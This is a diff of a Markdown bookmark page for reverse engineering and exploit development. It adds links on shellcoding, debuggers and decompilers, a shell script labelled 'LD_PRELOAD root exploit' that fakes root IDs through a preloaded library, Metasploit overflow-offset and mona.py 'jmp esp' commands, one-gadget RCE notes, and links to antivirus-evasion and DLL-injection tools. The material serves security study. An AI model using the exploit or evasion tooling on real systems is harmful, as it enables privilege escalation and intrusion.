@@ -25,9 +25,9 @@ published: true
 
 # Awesome awesomeness
 
-* [michalmalik/linux-re-101](https://github.com/michalmalik/linux-re-101) - a collection of resources for linux reverse engineering 
-* [Reverse Engineering (RE) Tools](https://securedorg.github.io/RE101/section3/)
-* [Reverse Engineering Resources](https://pewpewthespells.com/re.html) - ([web.archive.org](http://web.archive.org/web/20161007013208/http://pewpewthespells.com/re.html))
+* [michalmalik/linux-re-101 (michalmalik/linux-re-101)](https://github.com/michalmalik/linux-re-101) - a collection of resources for linux reverse engineering 
+* [Reverse Engineering (RE) Tools (RE101/section3)](https://securedorg.github.io/RE101/section3/)
+* [Reverse Engineering Resources (pewpewthespells.com/re.html)](https://pewpewthespells.com/re.html) - ([web.archive.org](http://web.archive.org/web/20161007013208/http://pewpewthespells.com/re.html))
 
 # Reverse Bookmarks
 
@@ -35,6 +35,7 @@ published: true
 
 * [libcdb.com](http://libcdb.com/) - libc database
 * [libc-database](https://github.com/niklasb/libc-database) - build a database of libc offsets to simplify exploitation
+* [X86 opcode and instruction reference](http://ref.x86asm.net/) ([cored64](http://ref.x86asm.net/coder64.html))
 
 <br>
 
@@ -47,23 +48,30 @@ published: true
 
 ## Studying (practical)
 
+*I do not know the best order of studying.*
+
+Shellcoding and exploit development:
+
 * [Linux (x86) Exploit Development Series](https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/)
+* [Shellcoding for Linux and Windows tutorial](http://www.vividmachines.com/shellcode/shellcode.html)
+* [Best books, tutorials and courses to learn about exploit development](http://www.pentest.guru/index.php/2016/01/28/best-books-tutorials-and-courses-to-learn-about-exploit-development/)
+* opensecuritytraining.info - [exploits1 - Introduction to software exploits](http://opensecuritytraining.info/Exploits1.html), [exploits2 - Exploitation in the Windows environment](http://opensecuritytraining.info/Exploits2.html)
+* The Art of Shellcoding - [Shellcoding 101](https://impureworld.wordpress.com/2017/04/09/the-art-of-shellcoding-shellcoding-101/), [Shellcoding 102](https://impureworld.wordpress.com/2017/04/11/the-art-of-shellcoding-shellcoding-102/), ... (*basics*)
+
+<br>
+
 * [Memory Layout of C Programs](http://www.geeksforgeeks.org/memory-layout-of-c-program/)
 * [ELF loading and relocs](http://netwinder.osuosl.org/users/p/patb/public_html/elf_relocs.html)
 * [Linker and libraries guide](http://docs.oracle.com/cd/E23824_01/html/819-0690/glcdi.html#scrolltoc)
-* [Shellcoding for windows and linux tutorial](http://www.vividmachines.com/shellcode/shellcode.html)
+* [Shellcodes database for study cases (shell-storm.org)](http://shell-storm.org/shellcode/)
 * [Linux syscalls (sysenter)](https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/#using-sysenter-system-calls-with-your-own-assembly)
 
 <br>
 
 * [Reverse Engineering Malware 101](https://securedorg.github.io/RE101/)
-* The Art of Shellcoding - [Shellcoding 101](https://impureworld.wordpress.com/2017/04/09/the-art-of-shellcoding-shellcoding-101/), [Shellcoding 102](https://impureworld.wordpress.com/2017/04/11/the-art-of-shellcoding-shellcoding-102/), ... (*basics*)
-
-<br>
-
-* opensecuritytraining.info - [exploits1](http://opensecuritytraining.info/Exploits1.html), [exploits2](http://opensecuritytraining.info/Exploits2.html)
 * [DefconRussia](https://www.slideshare.net/DefconRussia/)
 * [wasm](http://www.wasm.ru/) (link broken look web.archive.org [web.archive wasm](http://web.archive.org/web/20121224160453/http://www.wasm.ru/) ) (forum)
+* [Reversing C++ programs with IDA pro and Hex-rays](https://blog.0xbadc0de.be/archives/67)
 
 ### Heap
 
@@ -93,6 +101,13 @@ Other:
 
 <br><br>
 
+### Windows internal structures
+
+* [Terminus Project](http://terminus.rewolf.pl/terminus/) - automatically generated diff of Windows structures gathered from NTDLL
+* [Evolution of PEB](http://blog.rewolf.pl/blog/?p=573) - windows (PEB) Process Environment Block ([picture only](http://terminus.rewolf.pl/terminus/structures/ntdll/_PEB_combined.html))
+
+<br><br>
+
 ### Anti-Reverse
 
 * obfuscation
@@ -100,11 +115,9 @@ Other:
 
 ### Remainings
 
-* [getting function names from ***go-lang*** executable in IDA](https://habrahabr.ru/post/325498/)
+[getting function names from ***go-lang*** executable in IDA](https://habrahabr.ru/post/325498/)
 
-<br>
-
-* [Detecting LD_PRELOAD](http://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/)
+[Detecting LD_PRELOAD](http://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/)
 
 <br>
 
@@ -136,7 +149,39 @@ Other:
 ### Shellcodes
 
 * [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) (metasploit)
+* metasploit modules for reversive purposes:
+
+    `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb` - create nonrecurrent pattern, where each substring is unique (this string is used for feeding into overflow vulnerability and see where rip jumped after stack/smth overflow (works for trivial attacks))
+    
+    `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb` - get offset of substring in long pattern, created previously
+
+    Convert instructions into opcodes: `$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` -> `nasm> jmp esp`
+
 * [Veil](https://github.com/Veil-Framework/Veil) - [wiki](https://github.com/Veil-Framework/Veil/wiki) - generate metasploit payloads that bypass common anti-virus solutions
+
+*   ***LD_PRELOAD root exploit***
+
+    <div class="spoiler">
+    <div class="spoiler-title" markdown="1">
+    *(http://lcamtuf.coredump.cx/soft/ld-expl)*:
+    </div>
+    <div class="spoiler-text" markdown="1">
+    ``` bash
+    #!/bin/sh
+    cd /tmp
+    cat >expl.c <<eof
+    int getuid() { return 0; }
+    int geteuid() { return 0; }
+    int getgid() { return 0; }
+    int getegid() { return 0; }
+    eof
+    gcc -shared expl.c -o expl.so
+    LD_PRELOAD=/tmp/expl.so sh
+    rm /tmp/expl.so /tmp/expl.c
+    ```
+
+    </div>
+    </div>
 
 * {:.dummy} [Duck toolkit](https://ducktoolkit.com/) - online payload scripts generator (win, linux)
 * {:.dummy} [Bunny toolkit](https://bunnytoolkit.com/payloadindex/) - some payload examples
@@ -176,6 +221,7 @@ Other:
     * [ret-sync](https://github.com/bootleg/ret-sync) - a set of plugins that helps to synchronize a debugging session (WinDbg/GDB/LLDB/OllyDbg2/x64dbg) with IDA disassembler.
     * [Ponce](https://github.com/illera88/Ponce) - symbolic execution (symbolic solver + execution)
     * [IDA_JNI_Rename](https://github.com/trojancyborg/IDA_JNI_Rename) - header and script for correct decompilation of native android libraries
+    * {:.dummy}[1111joe1111/ida_ea](https://github.com/1111joe1111/ida_ea) - a set of exploitation/reversing aids for IDA - (do not know how it is useful)
 
 * **gdb**
 
@@ -185,13 +231,13 @@ Other:
 
     gdb steroids:
 
-    * **[gdb peda](https://github.com/longld/peda)** - **Python Exploit Development Assistance for GDB**
+    * **[gdb peda](https://github.com/longld/peda)** - **Python Exploit Development Assistance for GDB** ([Linux interactive exploit evelopment with GDB and PEDA (blackhat 2012)](http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf))
     * [gef](https://github.com/hugsy/gef) - multi-architecture gdb enhanced features for exploiters & reverse-engineers, [docs](http://gef.readthedocs.io/en/latest/)
     * [gdb-heap](https://github.com/rogerhu/gdb-heap)
     * [pwndbg](https://github.com/zachriggle/pwndbg) ([features](https://github.com/pwndbg/pwndbg/blob/master/FEATURES.md)) - *emulation*, *heap inspection*, ida pro integration, qemu compatibility, etc.
     * [gdb duel](https://github.com/vuvova/gdb-tools/blob/arpeggio/duel/help.md) - purpose language designed for concise state exploration of debugged C programs. ([gdb duel (ru) (хабр)](https://habrahabr.ru/post/328180/))
 
-* **[pwntools](https://docs.pwntools.com/en/stable/) - framework and exploit development library ([examples](https://github.com/Gallopsled/pwntools/tree/dev/examples))**
+* **[pwntools](https://docs.pwntools.com/en/stable/) - framework and exploit development library ([pwntools-usage-examples](https://github.com/Gallopsled/pwntools-write-ups)) ([examples](https://github.com/Gallopsled/pwntools/tree/dev/examples))**
 
 * [ROPgadget](https://github.com/JonathanSalwan/ROPgadget), [rp++](https://github.com/0vercl0k/rp) - search for rop-gadgets, [one_gadget](https://github.com/david942j/one_gadget) - search for one-gadget rce in binary
     
@@ -221,31 +267,49 @@ Other:
 
 #### windows (PE)
 
-* [ImmunityDebugger](https://www.immunityinc.com/products/debugger/) – debugger (PE only)
+* **Debuggers**:
 
-    Steroids:
+    * [ImmunityDebugger v1.85](https://www.immunityinc.com/products/debugger/) (before 2013)
+        <br> Steroids: [mona.py](https://github.com/corelan/mona) - [mona.py manual](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
+        <br> [Immunity debugger goodies (part 1)](https://brundlelab.wordpress.com/2010/09/10/immunity-debugger-goodies-part-1/)
+        <br> [Hack-with-Github/Powerful-Plugins (github)](https://github.com/Hack-with-Github/Powerful-Plugins/blob/master/Immunity.md) - some immunity plugins
 
-    * [mona.py](https://github.com/corelan/mona) - [mona.py manual](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
-    
+        <div class="spoiler"><div class="spoiler-title" markdown="1">
+        *mona.py cheatsheet*
+        </div><div class="spoiler-text" markdown="1">
+        ```
+        !mona.py modules
+        !mona find -s "\xff\xe4" -m slmfs.dll    # find substring in file
+        ```
+        </div></div>
 
-* x64/x86 imports reconstruction tools
+    * [OllyDbg v2.01](http://www.ollydbg.de/version2.html) (27 September 2013)
+    * ***windbg***
 
-    * ***Import Reconstructor***
-    
-        В нём указывается работающий процесс, и указывается в этом процессе место, в котором записана таблица импорта функций из ядра
+* **Static analysis/patching**:
+
+    * x64/x86 imports reconstruction tools
+
+        * ***Import Reconstructor***
         
-        * RVA – адрес этого места в бинарнике
-        * OEP – адрес точки старта в файле
-        * Size – размер указанной таблицы импорта
-        
-        После всего этого файл находит, что импортируется в данный бинарник, и может починить бинарник, правильно перезаписав таблицу импорта в том месте, где она должна была бы быть. (Мы при этом сохраням тот вид бинарника, который в памяти, т.е. например он может быть наполовину расшифрованным, если хакер там пытался себя шифровать)
+            В нём указывается работающий процесс, и указывается в этом процессе место, в котором записана таблица импорта функций из ядра
+            
+            * RVA – адрес этого места в бинарнике
+            * OEP – адрес точки старта в файле
+            * Size – размер указанной таблицы импорта
+            
+            После всего этого файл находит, что импортируется в данный бинарник, и может починить бинарник, правильно перезаписав таблицу импорта в том месте, где она должна была бы быть. (Мы при этом сохраням тот вид бинарника, который в памяти, т.е. например он может быть наполовину расшифрованным, если хакер там пытался себя шифровать)
 
-    * [Scylla](https://github.com/NtQuery/Scylla)
+        * [Scylla](https://github.com/NtQuery/Scylla)
 
-* ***PETools***, [pefile](https://github.com/erocarrera/pefile), ***PEid*** – tools for PE-files analysis, modification, live memory dumps, etc.
-* [Resource Hacker](http://www.angusj.com/resourcehacker/) – tool for modification of resources inside PE-files
-* [Dependency Walker](http://www.dependencywalker.com/) - scans any x32/x64 windows module and builds a hierarchical tree diagram of all dependent modules
+    * ***PETools***, [pefile](https://github.com/erocarrera/pefile), ***PEid*** – tools for PE-files analysis, modification, live memory dumps, etc.
+    * [Resource Hacker](http://www.angusj.com/resourcehacker/) – tool for modification of resources inside PE-files
+    * [Dependency Walker](http://www.dependencywalker.com/) - scans any x32/x64 windows module and builds a hierarchical tree diagram of all dependent modules
 
+* **Dynamic analysis/patching**:
+
+    * [api-monitor-v2r13-x86-x64](http://www.rohitab.com/apimonitor) – lets you monitor and control API calls made by applications and services
+    * [RemoteDll](http://securityxploded.com/remotedll.php) – tool to Inject DLL or Remove DLL from Remote Process, based on *Dll injection techics*: *CreateRemoteThread*, *NtCreateThread* (good for cross-sessions injections), *QueueUseAPC* (delayed injection)
 
 ### utilities
 
@@ -265,13 +329,20 @@ Other:
 * ***strings***
 * ***lsof*** (linux) – ls opened files by process
 
+<br>
+
+* [memfetch](http://lcamtuf.coredump.cx/soft/memfetch.tgz) - a simple utility to take non-destructive snapshots of process address space
+
+<br>
+
+* [binvis.io](http://binvis.io/#/) - visual analysis of ELF, PE, PDF files - *looks more like a toy*
 
 ### decompilers (python, .NET/dotNet, delphi)
 
 Python
 
 * [uncompyle6](https://github.com/rocky/python-uncompyle6) – python decompiler
-* [pycdc](https://github.com/zrax/pycdc) - python decompiler
+* [pycdc](https://github.com/zrax/pycdc) (Decompyle++) - python decompiler
 * [dis](https://docs.python.org/2/library/dis.html?highlight=dis#module-dis) – python module, capable to disassemble python bytecode
 * [inspect](https://docs.python.org/2/library/inspect.html) – python module, which can get information about live objects (modules, classes, functions, etc.)
 
@@ -319,18 +390,22 @@ Use `dlsym(RTLD_NEXT, "system")` to get original function. Use `gcc -shared -fPI
 
 [x86 instruction listing](https://en.wikipedia.org/wiki/X86_instruction_listings#x86_integer_instructions)
 
-### Calling conversions
+### Calling convention
 
-System V x86_64 calling conversion: `rdi, rsi, rdx, rcx, r8, r9, [stack]`, return values: `rax, rdx` <br>
+System V x86_64 calling convention: `rdi, rsi, rdx, rcx, r8, r9, [stack]`, return values: `rax, rdx` <br>
 
-Syscall conversions:
+Syscall conventions:
 
 | arch | bitness | syscall number | arg 1 | arg 2 | arg 3 | arg 4 | arg 5 | arg 6 | call methods | return |
 | i386 | 32 | EAX | EBX | ECX | EDX | ESI | EDI | EBP | int 0x80 | EAX |
 | x86_64 | 64 | RAX | RDI | RSI | RDX | R10 | R8 | R9 | syscall | RAX |
 | ARM eabi | 32 | r7 | r0 | r1 | r2 | r3 | r4 | r5 | swi 0x0 | r1 |
 
-[Other OS calling conversions](https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions)
+[Other OS calling conventions](https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions)
+
+<br>
+
+* [Syscalls for various architectures](https://w3challs.com/syscalls/)
 
 <br>
 
@@ -364,9 +439,10 @@ This rop-gadget for setting `rdi`, `rsi`, `rdx` exist almost in every binary (li
 
 #### One-gadget RCE
 
-glibc contains next 3 gadgets, which can be used to start /bin/sh under x86_x64
+* [***one_gadget***](https://github.com/david942j/one_gadget) - utility to search one-gadget rce in binaries
+* More One-gadget RCE's (x32 and x86): [one-gadget RCE in Ubuntu 16.04 libc](https://kimiyuki.net/blog/2016/09/16/one-gadget-rce-ubuntu-1604/)
 
-(if rsi != 0 and points to non-existant memory, there will be problems)
+**Example**: glibc contains next 3 gadgets, which can be used to start `/bin/sh` under `x86_x64` (if rsi != 0 and points to non-existant memory, there will be problems)
 
 <table>
 <colgroup><col style="width: 20%"/><col style="width: 20%"/><col style="width: 20%"/></colgroup>
@@ -401,10 +477,6 @@ glibc contains next 3 gadgets, which can be used to start /bin/sh under x86_x64
 .text:00000000000F0582                 call    abort
 ```
 </td></table>
-
-More One-gadget RCE's (x32 and x86): [one-gadget RCE in Ubuntu 16.04 libc](https://kimiyuki.net/blog/2016/09/16/one-gadget-rce-ubuntu-1604/)
-
-[one_gadget](https://github.com/david942j/one_gadget) - utility to search one-gadget rce in binaries
 
 <br>
 
